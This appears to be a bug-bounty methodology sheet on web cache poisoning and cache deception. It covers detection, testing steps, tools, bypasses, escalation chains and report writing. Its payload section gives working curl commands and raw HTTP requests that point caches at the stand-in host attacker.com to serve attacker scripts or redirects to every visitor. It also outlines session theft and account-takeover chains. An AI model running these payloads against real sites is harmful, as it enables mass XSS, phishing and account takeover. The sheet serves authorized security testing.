# Web Cache Poisoning

> One-line summary: A cache ignores some request input (a header, a query param) that the app reflects into the response — one request poisons the cached copy served to every user, turning a header bug into stored XSS or mass redirect.

## Overview

Web cache poisoning abuses the gap between what a cache uses as its key (usually method + host + path + selected query params) and what the application uses to build the response. Any input that changes the response but is absent from the key — an unkeyed header like `X-Forwarded-Host`, an unkeyed query parameter, a fat GET body — lets you cause the cache to store *your* response under a URL other users request. The classic escalation: the app reflects `X-Forwarded-Host` into an absolute URL (script tag, redirect, canonical link, password-reset link), the cache stores the malicious response, and every visitor gets attacker-controlled JavaScript or a redirect to an attacker domain. It pays because the impact is population-wide (stored XSS without needing a victim) and the reproduction is compact and deterministic.

## Where to find it

- Response headers announcing caching: `X-Cache`, `X-Cache-Hits`, `CF-Cache-Status`, `Age`, `X-Served-By`, `Via`, `X-Varnish`, `X-Proxy-Cache`
- Unkeyed header candidates: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Forwarded-Port`, `X-Forwarded-Server`, `X-Forwarded-Prefix`, `X-Host`, `Forwarded`, `X-Original-URL`, `X-Rewrite-URL`, `X-HTTP-Method-Override`
- Responses that vary on those inputs: absolute URLs in redirects, `<script src>`, `<link href>`, canonical/og:url tags, password-reset links, CDN cache keys
- Unkeyed query parameters: params the cache strips or ignores (analytics params like `utm_*`, `fbclid`, unknown params on caching layers configured with query-string whitelists)
- Fat GET endpoints: bodies on GET requests that the app reflects or merges into query params
- Cacheable endpoints worth poisoning: localized pages (`/en/`, `/de/`), marketing and error pages (some caches store 404/redirects), static asset paths served through the app, `/login` and other unauthenticated pages
- Responses whose body varies with request headers: canonical/hreflang/og:url tags, absolute asset URLs — add headers one at a time and diff the body
- Multi-tier caches (CDN in front of a framework cache): the inner cache's key differs from the outer's, so a refresh on one tier can be re-poisoned through the other
- Anything with `?lang=`/`?locale=` parameters — high TTL, low session dependence, population-wide reach
- Host/CDN routing quirks: `Host:` header variants that select a cacheable vhost while the backend builds absolute URLs from `X-Forwarded-Host`
- Web cache deception surface (the sibling bug class): authenticated pages reachable at asset-looking paths (`/account/profile.css`, `/api/user.json`)

## Methodology

1. **Confirm caching** — request a resource twice and compare headers: `X-Cache: hit`/`CF-Cache-Status: HIT` on the second, and an increasing `Age`. If there is no cache header, test other subdomains/hosts (CDNs may cache only some).
2. **Find unkeyed inputs** — run Param Miner's "Guess headers" and "Guess GET parameters" against cacheable paths, or manually: send a header with a unique value and diff the response; if the response changes, the input is *reflected*; then check whether it is *keyed* (varies per value in the cache key) or *unkeyed* (same cached object regardless of value).
3. **Cache-buster discipline** — while testing, append a unique param (`?cb=<random>`) so your poisoned entry is only served to your own test URL, never to real users. Verify the buster is itself keyed (same buster URL returns the same cached object; changing it forces a MISS).
4. **Confirm the poison cycle** — (a) fetch the URL with the unique buster and the malicious header, note MISS and `X-Cache` now storing it; (b) fetch the exact same buster URL *without* the header; if the malicious content/redirect is served with a HIT, the input is unkeyed and cacheable.
5. **Pick a payload with impact** — reflection into `<script src>` (XSS), `Location`/redirect target (phishing, OAuth token theft), reset-link host (account takeover vector), or DoS via redirect to a dead host. Encode per context: inside a script src you need a host you control, inside HTML you may inject tags directly.
6. **Quantify scope** — determine TTL (`Cache-Control: max-age`, `Age`), whether unauthenticated users are affected (fetch without cookies in a clean session), and how many URLs/routes use the same cache rule (one localized path usually means all locales are poisonable the same way).
7. **Clean up after confirmation** — re-request the poisoned URL until the entry expires or is replaced, especially for redirect/DoS payloads; note in the report that the cache was restored.
8. **Prove impact** — a clean unauthenticated fetch of the poisoned URL that returns your payload, plus (for XSS) the script executing in a browser. Screenshot with the response headers (HIT + Age) visible.

## Payloads

```bash
# 1) Detect caching
curl -sI https://target.com/en/ | grep -Ei 'x-cache|cf-cache-status|age|via|x-served-by|x-varnish'

# 2) Full poison cycle with a cache buster (poison, then read back without the header)
CB=$(date +%s)
curl -si -H "X-Forwarded-Host: attacker.com" "https://target.com/en?cb=$CB" | grep -Ei '(attacker\.com|x-cache|age)'
curl -si "https://target.com/en?cb=$CB" | grep -Ei '(attacker\.com|x-cache|age)'
# Second request showing attacker.com + X-Cache: HIT = confirmed unkeyed header.

# 3) Sweep the usual unkeyed header candidates on one cached URL
CB=$(date +%s)
for h in X-Forwarded-Host X-Forwarded-Scheme X-Forwarded-Proto X-Forwarded-Port X-Forwarded-Server X-Forwarded-Prefix X-Host X-Original-URL X-Rewrite-URL Forwarded; do
  out=$(curl -si -H "$h: poison-$CB" "https://target.com/en?cb=$CB" | grep -c "poison-$CB")
  [ "$out" != "0" ] && echo "REFLECTED: $h"
done
```

```http
# Classic XSS poison — host reflected into an absolute script URL, then cached.
# Step 1 (poison):
GET /en?cb=1337 HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
# Response contains: <script src="https://attacker.com/static/app.js"></script>  -> stored in cache.
# Step 2 (victim):
GET /en?cb=1337 HTTP/1.1
Host: target.com
# Served from cache: attacker.com script executes for every visitor of this URL.
```

```http
# Redirect poison via scheme/host handling (frontends that force HTTPS through a redirect)
GET /?cb=1337 HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps
X-Forwarded-Host: attacker.com
# Some stacks answer 301 Location: https://attacker.com/ -> cache the redirect.
```

```http
# Fat GET poison — body merged into parameters on GET requests
GET /api/preview?cb=1 HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 35

{"redirect":"https://attacker.com"}
# Content-Length 35 is the exact byte length of that JSON body; recount if you edit it.
```

```http
# Unkeyed query parameter — the cache drops the param from its key, the app reflects it
GET /en?utm_content=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&cb=1337 HTTP/1.1
Host: target.com
# Cache key includes cb but not utm_content: every visitor of this exact URL gets the script.
```

```bash
# Nuclei sweep for cache-header misconfigurations (community templates)
nuclei -u https://target.com -tags cache

# After confirming, purge/refresh your test entry
curl -s "https://target.com/en?cb=1337" -H "Pragma: no-cache" >/dev/null; sleep 2
curl -sI "https://target.com/en?cb=1337" | grep -Ei 'x-cache|age'
```

## Bypasses & edge cases

- **Unkeyed query strings** — some caches ignore specific params (`utm_*`, `fbclid`) while the app reflects them. If your buster is stripped, the "clean" victim URL differs from your test URL — adjust the buster to a param the cache *does* key on, and keep the malicious payload in the unkeyed one.
- **Unkeyed port / host quirks** — caches keying only on hostname while the app uses the port: `Host: target.com:1337` changes app behavior (absolute URLs include the port) without changing the cache key. Test odd/duplicate port forms (`:80`, `:443`, `:00080`).
- **Header normalization conflicts** — frontend and backend disagree on duplicate `X-Forwarded-Host` values (first vs last wins) or comma-joined values; the cache may key on the header while the app reads a different instance of it, enabling poisoning where a naive test shows the header as "keyed".
- **Case/whitespace variance** — caches treat `X-Forwarded-Host` and `x-forwarded-host` differently than backends do; also `Header : value` (space before colon) or trailing spaces can pass parsers differently.
- **Method and Vary interactions** — a `Vary` header that omits the input you abuse is the bug; conversely if the cache honors `Vary: User-Agent` etc., pick an input not covered. Also test POST-with-`X-HTTP-Method-Override: GET` responses being cached under the GET key.
- **Non-200 caching** — redirects (301/302) and even 404 pages get cached by default in many configs; a canned redirect is a stable poisoning primitive.
- **`Cache-Control: no-cache` on your request doesn't protect victims** — the directive only skips the cache for *your* request; the poisoned object still serves everyone else. Poison with a buster, then verify with a plain request.
- **Expiry races** — around `Age` == `max-age` the first request after expiry refills the entry; a single crafted request at that moment re-poisons it, which is how short-TTL caches stay continuously poisoned.
- **Cache key poisoning (CPDoS family)** — oversized headers (HHO), oversized meta (HMC), or method-hidden errors (HMC via `X-HTTP-Method-Override`) can cause an error page to be cached for a healthy URL — a DoS angle, but many programs rate it informational, so lead with XSS/redirect impact instead.
- **Web cache deception (sibling class)** — the reverse trick: make the *victim's* private response land in the cache under a public-looking URL (`/account/profile.css`), then fetch it yourself. Test appended extensions, delimiters (`;`, `%2f`, `%23`), and case variations; session cookies make it authenticated data.
- **Poisoning vs deception reporting** — keep them separate in one report each: poisoning affects all users of a URL; deception leaks one victim's data to the attacker.

## Tools

- Burp Suite + **Param Miner** (BApp Store, James Kettle) — the standard for unkeyed input discovery: right-click a cacheable request → "Guess headers" / "Guess GET parameters" / "Guess cookies", plus its cache-poisoning and deception scans. Combine with Repeater for the poison/read-back cycle.
- curl — the whole methodology above is curl-able; keep the buster param consistent between poison and verify requests.
- **toxicache** — community tool for bulk unkeyed-header scanning across a URL list; check its `--help` for the invocation your version ships.
- nuclei — community templates for cache-header and CDN misconfigs: `nuclei -u https://target.com -tags cache`
- Browser devtools / a second clean browser profile — confirm the XSS/redirect actually executes for an unauthenticated victim (no cookies, fresh cache).

## Escalation & chaining

- **Cache poison → stored XSS** — host-reflected-into-script is the highest-value chain: unauthenticated, no victim interaction beyond visiting the page, and every visitor executes your JS (session theft, keylogging, credential phishing in place).
- **Cache poison → mass redirect → credential phishing** — poisoning a login or SSO entry page redirect gives you the whole user base; redirect the OAuth/OIDC `redirect_uri`-adjacent flows to steal tokens.
- **Cache poison → account takeover surfaces** — if the reflected host lands in password-reset or invite links generated server-side, poisoned caches make every victim's reset email point at your domain.
- **Cache poison → DoS** — cached redirects to a nonexistent domain brick a route for all users; low bounty value but useful as a chained nuisance/secondary finding.
- **Cache deception → PII → ATO** — cached authenticated pages (API keys, session listings, billing) readable by an unauthenticated attacker can end in account takeover.
- **Smuggling → cache poisoning** — when no unkeyed input exists, an HTTP desync can inject a cacheable response for a completely different URL (Kettle's smuggling-meets-caching chains); see the request smuggling skill.

## Report notes

- The full cycle in order, with raw requests/responses for each step: MISS and stored-state request (with the malicious header), then the clean unauthenticated read-back showing `X-Cache: HIT` / `CF-Cache-Status: HIT` / `Age` and the payload in the response.
- Name the exact unkeyed input(s) and the reflected context; include the buster URL used so triage can reproduce without cache ambiguity.
- TTL and persistence: `Cache-Control: max-age`, observed `Age`, and when you observed the entry expire — plus confirmation you left the cache clean.
- Impact: which URLs/paths share the rule (localized variants, subdomains), whether unauthenticated users are hit, and the concrete payload effect (script executes / 301 to attacker domain). Attach the browser screenshot for XSS.
- For deception reports: show the victim-side request (with auth) caching the response and the attacker-side read-back with no credentials; one redacted data sample proves it.
- Remediation framing: include the offending input in the cache key (`Vary`), stop reflecting headers into responses, and normalize headers at the edge — reports graded higher when the root cause is named.

## References

- [PortSwigger — Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger Research — Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [PortSwigger Research — Web Cache Entanglement: Novel Pathways to Poisoning](https://portswigger.net/research/web-cache-entanglement)
- [PortSwigger Research — Gotta Cache 'em All: Bending the Rules of Web Cache Exploitation](https://portswigger.net/research/gotta-cache-em-all)
- [PortSwigger — Web cache deception](https://portswigger.net/web-security/web-cache-deception)
- [OWASP — Cache poisoning](https://owasp.org/www-community/attacks/Cache_Poisoning)
- [HackTricks — Web cache deception](https://book.hacktricks.xyz/pentesting-web/cache-deception)
